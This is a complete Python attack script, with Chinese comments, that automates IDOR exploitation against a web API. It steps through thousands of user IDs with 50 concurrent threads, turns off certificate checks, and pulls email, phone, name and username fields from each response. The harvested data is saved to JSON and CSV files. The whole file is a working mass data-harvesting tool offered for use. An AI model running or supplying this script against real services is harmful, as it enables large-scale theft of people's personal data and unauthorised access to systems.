#!/usr/bin/env python3
"""
API批量枚举工具 - IDOR自动化
用法: python3 api_enum.py -u https://target.com/api/user/{} -s 1 -e 10000 -t 50
"""

import requests
import argparse
import concurrent.futures
import json
from tqdm import tqdm
import warnings
warnings.filterwarnings('ignore')

class APIEnumerator:
    def __init__(self, url_template, start, end, threads=50):
        self.url_template = url_template
        self.start = start
        self.end = end
        self.threads = threads
        self.results = []
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'
        }
    
    def fetch(self, id):
        """获取单个ID数据"""
        url = self.url_template.replace('{}', str(id))
        try:
            r = self.session.get(url, timeout=5)
            if r.status_code == 200:
                try:
                    data = r.json()
                    # 提取敏感字段
                    sensitive = {}
                    for key in ['id', 'email', 'phone', 'name', 'username']:
                        if key in data:
                            sensitive[key] = data[key]
                    
                    if sensitive:
                        return (id, sensitive)
                except:
                    return (id, {'raw': r.text[:100]})
        except:
            pass
        return None
    
    def enumerate(self):
        """批量枚举"""
        print(f"[*] 枚举范围: {self.start} - {self.end}")
        print(f"[*] 并发线程: {self.threads}")
        print(f"[*] URL模板: {self.url_template}\n")
        
        id_range = range(self.start, self.end + 1)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.fetch, id): id for id in id_range}
            
            with tqdm(total=len(id_range), desc="枚举进度") as pbar:
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    if result:
                        self.results.append(result)
                    pbar.update(1)
        
        print(f"\n[+] 发现有效数据: {len(self.results)} 条")
        return self.results
    
    def save_results(self, output):
        """保存结果"""
        # JSON格式
        with open(f'{output}.json', 'w') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        
        # CSV格式（如果有email/phone）
        if self.results and any('email' in r[1] or 'phone' in r[1] for r in self.results):
            with open(f'{output}.csv', 'w') as f:
                f.write('id,email,phone,name,username\n')
                for id, data in self.results:
                    email = data.get('email', '')
                    phone = data.get('phone', '')
                    name = data.get('name', '')
                    username = data.get('username', '')
                    f.write(f'{id},{email},{phone},{name},{username}\n')
        
        print(f"[+] 保存到: {output}.json")
        if self.results:
            print(f"[+] 保存到: {output}.csv")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='API批量枚举工具')
    parser.add_argument('-u', '--url', required=True, help='URL模板（用{}代替ID）')
    parser.add_argument('-s', '--start', type=int, default=1, help='起始ID')
    parser.add_argument('-e', '--end', type=int, default=10000, help='结束ID')
    parser.add_argument('-t', '--threads', type=int, default=50, help='并发线程数')
    parser.add_argument('-o', '--output', default='results', help='输出文件前缀')
    parser.add_argument('--token', help='Authorization Token')
    
    args = parser.parse_args()
    
    enumerator = APIEnumerator(args.url, args.start, args.end, args.threads)
    
    # 添加Token（如果提供）
    if args.token:
        enumerator.session.headers['Authorization'] = f'Bearer {args.token}'
    
    # 执行枚举
    enumerator.enumerate()
    
    # 保存结果
    if enumerator.results:
        enumerator.save_results(args.output)
        
        # 显示前5条
        print(f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print("【数据预览】（前5条）")
        print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for id, data in enumerator.results[:5]:
            print(f"ID: {id}")
            for k, v in data.items():
                print(f"  {k}: {v}")
            print()
